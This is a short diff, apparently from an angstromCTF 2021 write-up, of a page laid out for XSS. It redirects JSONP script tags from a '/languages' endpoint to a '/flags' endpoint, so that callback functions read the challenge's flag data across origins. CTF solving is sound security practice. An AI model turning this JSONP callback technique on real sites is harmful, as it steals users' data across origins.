@@ -20,9 +20,9 @@ layout: xss
         console.log("DATA" + data);
     }
     var script = document.createElement('script');
-    script.src = 'https://jason.2021.chall.actf.co/languages?callback=processWeatherCallback';
+    script.src = 'https://jason.2021.chall.actf.co/flags?callback=processWeatherCallback';
     script.referrerPolicy = "no-referrer";
     document.body.appendChild(script);
 </script>
 
-<script src="https://jason.2021.chall.actf.co/languages?callback=xss_redirect" referrerpolicy="no-referrer"></script>
+<script src="https://jason.2021.chall.actf.co/flags?callback=xss_redirect" referrerpolicy="no-referrer"></script>
